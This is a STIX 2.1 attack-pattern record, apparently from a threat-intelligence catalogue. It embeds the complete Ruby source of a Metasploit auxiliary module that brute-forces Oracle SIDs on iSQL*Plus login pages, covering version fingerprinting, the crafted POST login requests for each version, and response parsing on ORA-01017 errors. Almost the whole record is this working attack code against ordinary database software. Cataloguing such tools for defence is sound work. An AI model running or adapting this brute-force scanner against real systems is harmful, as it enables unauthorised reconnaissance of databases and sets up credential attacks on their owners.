{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57b4ea2e-2f53-4b93-8654-dd8f10749736",
    "created": "2024-08-14T16:27:56.00249Z",
    "modified": "2024-08-14T16:27:56.002494Z",
    "name": "Oracle iSQLPlus SID Check",
    "description": " This module attempts to bruteforce the SID on the Oracle application server iSQL*Plus login pages.  It does this by testing Oracle error responses returned in the HTTP response. Incorrect username/pass with a correct SID will produce an Oracle ORA-01017 error. Works against Oracle 9.2, 10.1 & 10.2 iSQL*Plus.  This module will attempt to fingerprint the version and automatically select the correct POST request.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/oracle/isqlplus_sidbrute.rb",
            "external_id": "isqlplus_sidbrute.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'Oracle iSQLPlus SID Check',\n      'Description' => %q{\n        This module attempts to bruteforce the SID on the Oracle application server iSQL*Plus\n        login pages.  It does this by testing Oracle error responses returned in the HTTP response.\n        Incorrect username/pass with a correct SID will produce an Oracle ORA-01017 error.\n        Works against Oracle 9.2, 10.1 & 10.2 iSQL*Plus.  This module will attempt to\n        fingerprint the version and automatically select the correct POST request.\n      },\n      'References'  =>\n      [\n        [ 'URL', 'https://blog.carnal0wnage.com/' ],\n      ],\n      'Author'      => [ 'CG', 'todb' ],\n      'License'     => MSF_LICENSE\n      )\n\n      register_options([\n        Opt::RPORT(5560),\n        OptString.new('URI', [ true, 'Oracle iSQLPlus path', '/isqlplus/']),\n        OptString.new('SID', [ false, 'A single SID to test']),\n        OptPath.new('SIDFILE', [ false, 'A file containing a list of SIDs', File.join(Msf::Config.install_root, 'data', 'wordlists', 'sid.txt')]),\n        OptInt.new('TIMEOUT', [false, 'Time to wait for HTTP responses', 30])\n      ])\n\n      deregister_options(\n        \"RHOST\", \"USERNAME\", \"PASSWORD\", \"USER_FILE\", \"PASS_FILE\", \"USERPASS_FILE\",\n        \"BLANK_PASSWORDS\", \"USER_AS_PASS\", \"REMOVE_USER_FILE\", \"REMOVE_PASS_FILE\",\n        \"BRUTEFORCE_SPEED\" # Slow as heck anyway\n      )\n\n  end\n\n  def sid_file\n    datastore['SIDFILE']\n  end\n\n  def hostport\n    [target_host,rport].join(\":\")\n  end\n\n  def uri\n    datastore['URI'] || \"/isqlplus/\"\n  end\n\n  def timeout\n    (datastore['TIMEOUT'] || 30).to_i\n  end\n\n  def msg\n    msg = \"#{hostport} - Oracle iSQL*Plus -\"\n  end\n\n  def run_host(ip)\n    oracle_ver = get_oracle_version(ip)\n    if not check_oracle_version(oracle_ver)\n      print_error \"#{msg} Unknown Oracle version, skipping.\"\n      return\n    end\n    begin\n      print_status(\"#{msg} Starting SID check\")\n      sid_data.each do |sid|\n        guess = check_oracle_sid(ip,oracle_ver,sid)\n        return if guess and datastore['STOP_ON_SUCCESS']\n      end\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e\n        print_error \"#{msg} Cannot connect\"\n      rescue ::Timeout::Error, ::Errno::EPIPE,Errno::ECONNRESET => e\n        print_error e.message\n    end\n  end\n\n  def get_oracle_version(ip)\n    begin\n      res = send_request_cgi({\n        'version' => '1.1',\n        'uri'     => uri,\n        'method'  => 'GET',\n      }, timeout)\n      oracle_ver = nil\n      if (res.nil?)\n        print_error(\"#{msg} no response\")\n      elsif (res.code == 200)\n        print_status(\"#{msg} Received an HTTP #{res.code}\")\n        oracle_ver = detect_oracle_version(res)\n      elsif (res.code == 404)\n        print_error(\"#{msg} Received an HTTP 404, check URIPATH\")\n      elsif (res.code == 302)\n        print_error(\"#{msg} Received an HTTP 302 to #{res.headers['Location']}\")\n      else\n        print_error(\"#{msg} Received an HTTP #{res.code}\")\n      end\n      return oracle_ver\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e\n      print_error \"#{msg} Cannot connect\"\n    end\n  end\n\n  def detect_oracle_version(res)\n    m = res.body.match(/iSQL\\*Plus Release (9\\.0|9\\.1|9\\.2|10\\.1|10\\.2)/)\n    oracle_ver = nil\n    oracle_ver = 10 if m[1] && m[1] =~ /10/\n      oracle_ver = m[1].to_f if m[1] && m[1] =~ /9\\.[012]/\n      if oracle_ver\n        print_status(\"#{msg} Detected Oracle version #{oracle_ver}\")\n        print_status(\"#{msg} SID detection for iSQL*Plus 10.1 may be unreliable\") if oracle_ver == 10.1\n      else\n        print_error(\"#{msg} Unknown Oracle version detected.\")\n      end\n    return oracle_ver\n  end\n\n  def check_oracle_version(ver)\n    [9.0,9.1,9.2,10].include? ver\n  end\n\n  def build_post_request(ver,sid)\n    post_request = nil\n    case ver\n    when 9.0\n      post_request = \"action=logon&sqlcmd=&sqlparms=&username=scott&password=tiger&sid=#{sid.strip}&privilege=&Log+In=%B5%C7%C2%BC\"\n    when 9.1\n      post_request = \"action=logon&username=a&password=a&sid=#{sid.strip}&login=Login\"\n    when 9.2\n      post_request = \"action=logon&username=a&password=a&sid=#{sid.strip}&login=Login\"\n    when 10\n      post_request = \"username=a&password=a&connectID=#{sid.strip}&report=&script=&dynamic=&type=&action=&variables=&event=login\"\n    end\n    return post_request\n  end\n\n  def parse_isqlplus_response(res,sid)\n    guess = false\n    if (res.nil?)\n      print_error(\"#{msg} No response\")\n    elsif (res.code == 200)\n      if (res.body =~ /ORA-01017:/ or res.body =~ /ORA-28273:/)\n        if sid.nil? || sid.empty?\n          print_good(\"#{msg} Received ORA-01017 on a blank SID -- SIDs are not enforced upon login.\")\n        else\n          print_good(\"#{msg} Received ORA-01017, probable correct SID '#{sid.strip}'\")\n        end\n        guess = true\n      elsif (res.body =~ /(ORA-12170):/ or res.body =~ /(ORA-12154):/ or res.body =~ /(ORA-12162):/)\n        vprint_status(\"#{msg} Incorrect SID: '#{sid.strip}' (got error code #{$1})\")\n      elsif res.body =~ /(ORA-12541):/\n        print_status(\"#{msg} Possible correct SID, but got ORA-12541: No Listener error.\")\n        guess = true\n      else\n        print_status(\"#{msg} Received an unknown error\") # Should say what the error was\n      end\n    elsif (res.code == 404)\n      print_status(\"#{msg} Received an HTTP 404, check URIPATH\")\n    elsif (res.code == 302)\n      print_status(\"#{msg} Received an HTTP 302 redirect to #{res.headers['Location']}\")\n    else\n      print_status(\"#{msg} Received an unexpected response: #{res.code}\")\n    end\n\n    report_isqlplus_service(target_host,res) if res\n    return guess\n  end\n\n  def report_isqlplus_service(ip,res)\n    sname = datastore['SSL'] ? 'https' : 'http'\n    report_service(\n      :host => ip,\n      :proto => 'tcp',\n      :port => rport,\n      :name => sname,\n      :info => res.headers[\"Server\"].to_s.strip\n    )\n  end\n\n  def report_oracle_sid(ip,sid)\n    report_note(\n      :host => ip,\n      :proto => 'tcp',\n      :port => rport,\n      :type => \"oracle.sid\",\n      :data => ((sid.nil? || sid.empty?) ? \"*BLANK*\" : sid),\n      :update => :unique_data\n    )\n  end\n\n  def sid_data\n    if datastore['SID'] and not datastore['SID'].empty?\n      [datastore['SID']]\n    elsif sid_file and ::File.readable? sid_file\n      ::File.open(sid_file,\"rb\") {|f| f.read f.stat.size}.each_line.map {|x| x.strip.upcase}.uniq\n    else\n      raise ArugmentError, \"Cannot read file '#{sid_file}'\"\n    end\n  end\n\n  def check_oracle_sid(ip,oracle_ver,sid)\n    post_request = build_post_request(oracle_ver,sid)\n    vprint_status \"#{msg} Trying SID '#{sid}', waiting for response...\"\n    res = send_request_cgi({\n      'version' => '1.1',\n      'uri'     => uri,\n      'method'  => 'POST',\n      'data'   => post_request,\n      'headers' =>\n      {\n        'Referer' => \"http://#{ip}:#{rport}#{uri}\"\n      }\n    }, timeout)\n    guess = parse_isqlplus_response(res,sid)\n    report_oracle_sid(ip,sid) if guess\n    return guess\n  end\nend\n",
    "x_mitre_contributors": [
        "[ CG",
        "todb ]",
        ""
    ]
}